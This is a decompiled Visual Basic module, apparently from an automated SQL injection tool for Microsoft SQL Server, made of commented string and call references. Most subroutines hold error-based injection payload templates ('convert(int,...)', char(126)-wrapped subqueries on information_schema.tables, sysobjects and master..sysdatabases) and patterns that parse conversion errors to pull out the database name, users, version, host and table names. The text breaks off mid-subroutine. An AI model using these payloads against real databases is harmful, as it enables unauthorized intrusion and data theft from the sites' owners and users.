Attribute VB_Name = "msSQL"
' This code module rebuilt by VBRezQ v3.3a.  2-Feb-2012 / 19:56:12
Option Explicit 
 
'Sub Subr_197()
'N  * ref: __vbaExceptHandler
'N  * ref: Subr_195
'N  * ref: "convert(int,%String_Col%)"
'N  * ref: Subr_196
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVarList
'End Sub
 
'Sub Subr_198()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCmp
'N  * ref: Subr_195
'N  * ref: "convert(int,%String_Col%)"
'N  * ref: Subr_196
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVarList
'N  * ref: "db_name()"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "DB Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Current DB: "
'N  * ref: __vbaStrCat
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaStrMove
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: "current database to a higher value to enable this feature"
'N  * ref: __vbaInStr
'N  * ref: __vbaStrCmp
'N  * ref: ")"
'N  * ref: "Incorrect syntax near"
'N  * ref: __vbaInStr
'N  * ref: __vbaStrCmp
'N  * ref: "*Incorrect syntax near '(*)'.*"
'N  * ref: Subr_140
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: ")"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaStrCmp
'N  * ref: ")"
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarDup
'N  * ref: "Changing inejction syntax"
'N  * ref: Subr_143
'N  * ref: "Retrying to find current data base"
'N  * ref: Subr_143
'N  * ref: __vbaStrCopy
'N  * ref: Right(
'N  * ref: "--"
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaVarDup
'N  * ref: "I think i was wrong about injection type trying String type!"
'N  * ref: Subr_143
'N  * ref: Right(
'N  * ref: "--"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstEq
'N  * ref: "Cannot get current db name!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaVarDup
'N  * ref: "Changing inejction syntax"
'N  * ref: Subr_143
'N  * ref: Subr_195
'N  * ref: "convert(int,%String_Col%)--"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaVarDup
'N  * ref: "Bypassing illegal union failed! Turning off this feature"
'N  * ref: Subr_143
'N  * ref: "Retrying to find current data base"
'N  * ref: Subr_143
'N  * ref: Subr_198
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_199()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCopy
'N  * ref: "master"
'N  * ref: "name"
'N  * ref: "sysdatabases"
'N  * ref: Subr_204
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarForInit
'N  * ref: __vbaVarCat
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "(select "
'N  * ref: " from master..sysdatabases where dbid="
'N  * ref: ")"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Data Base Found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: vbTab
'N  * ref: __vbaVarDup
'N  * ref: "Data Bases: "
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: CDec(
'N  * ref: __vbaHresultCheck
'N  * ref: __vbaVarTstNe
'N  * ref: __vbaFreeVar
'N  * ref: "db_name("
'N  * ref: ")"
'N  * ref: Subr_193
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrMove
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Data Base Found: "
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: vbTab
'N  * ref: __vbaVarDup
'N  * ref: "Data Bases: "
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Subr_169
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarAdd
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_200()
'N  * ref: __vbaExceptHandler
'N  * ref: "user"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: __vbaStrMove
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Current User: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Current User: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "@@version"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Sql Version: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Sql Version: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "db_name()"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "DB Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Current DB: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "system_user"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "System User: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "System User: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "host_name()"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Host Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCat
'N  * ref: "Host Name: "
'N  * ref: vbTab
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "@@SERVERNAME"
'N  * ref: __vbaVarDup
'N  * ref: Subr_193
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: "*converting the nvarchar value '(*)' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaVarTstNe
'N  * ref: "Server Name: "
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Server Name: "
'N  * ref: __vbaStrCat
'N  * ref: vbTab
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: Subr_199
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_201()
'N  * ref: __vbaExceptHandler
'N  * ref: "cast("
'N  * ref: Subr_193
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: " as nvarchar(4000))"
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: Subr_193
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'End Sub
 
'Sub Subr_202()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaOnError
'N  * ref: __vbaStrCopy
'N  * ref: "*"
'N  * ref: "information_schema.tables"
'N  * ref: Subr_204
'N  * ref: __vbaI2I4
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaVarCat
'N  * ref: "table_name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from (select distinct top 1 table_name from "
'N  * ref: "information_schema.tables order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: "is not a valid user in database '"
'N  * ref: LCase(
'N  * ref: "'"
'N  * ref: LCase(
'N  * ref: "is not able to access the database &quot;"
'N  * ref: LCase(
'N  * ref: "&quot;"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Trying another method..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI2Var
'N  * ref: __vbaFreeVar
'N  * ref: "table_name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from (select distinct top "
'N  * ref: " table_name from "
'N  * ref: "information_schema.tables order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))"
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "table_name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from (select distinct top "
'N  * ref: " table_name from "
'N  * ref: "information_schema.tables order BY table_name ASC) sq order BY table_name DESC)%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: "Failed to get table no. "
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "TEMP"
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCopy
'N  * ref: __vbaBoolVar
'N  * ref: "U"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_194
'N  * ref: "xtype="
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "name"
'N  * ref: __vbaStrCopy
'N  * ref: "sysobjects"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_204
'N  * ref: __vbaI2I4
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarTstEq
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "U"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_194
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from "
'N  * ref: "sysobjects where id=(select top 1 id from (select distinct top "
'N  * ref: " id from "
'N  * ref: "sysobjects where xtype="
'N  * ref: " order BY id ASC) sq order BY id DESC))%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: "is not a valid user in database '"
'N  * ref: LCase(
'N  * ref: "'"
'N  * ref: LCase(
'N  * ref: "is not able to access the database &quot;"
'N  * ref: LCase(
'N  * ref: "&quot;"
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Trying another method..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Error: Access dennied!"
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaVarVargNofree
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI2Var
'N  * ref: __vbaFreeVar
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "U"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_194
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from "
'N  * ref: "sysobjects where id=(select top 1 id from (select distinct top "
'N  * ref: " id from "
'N  * ref: "sysobjects where xtype="
'N  * ref: " order BY id ASC) sq order BY id DESC))%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaCastObjVar
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaCastObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaStrCmp
'N  * ref: "name"
'N  * ref: __vbaVarDup
'N  * ref: Subr_201
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "["
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "].."
'N  * ref: __vbaStrCat
'N  * ref: __vbaVarDup
'N  * ref: __vbaStrCmp
'N  * ref: IIf(
'N  * ref: "U"
'N  * ref: __vbaStrCopy
'N  * ref: Subr_194
'N  * ref: "(char(126)%2b(select distinct top 1 "
'N  * ref: " from "
'N  * ref: "sysobjects where id=(select top 1 id from (select distinct top "
'N  * ref: " id from "
'N  * ref: "sysobjects where xtype="
'N  * ref: " order BY id ASC) sq order BY id DESC))%2bchar(126))"
'N  * ref: __vbaStrVarVal
'N  * ref: "%String_Col%"
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: Subr_151
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVarList
'N  * ref: "*converting the *varchar value '~(*)~' to *data type int.*"
'N  * ref: Subr_140
'N  * ref: Subr_183
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeVar
'N  * ref: __vbaStrCmp
'N  * ref: vbCrLf
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarCmpEq
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeVarList
'N  * ref: LCase(
'N  * ref: vbCrLf
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "Table found: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: "."
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: Subr_191
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
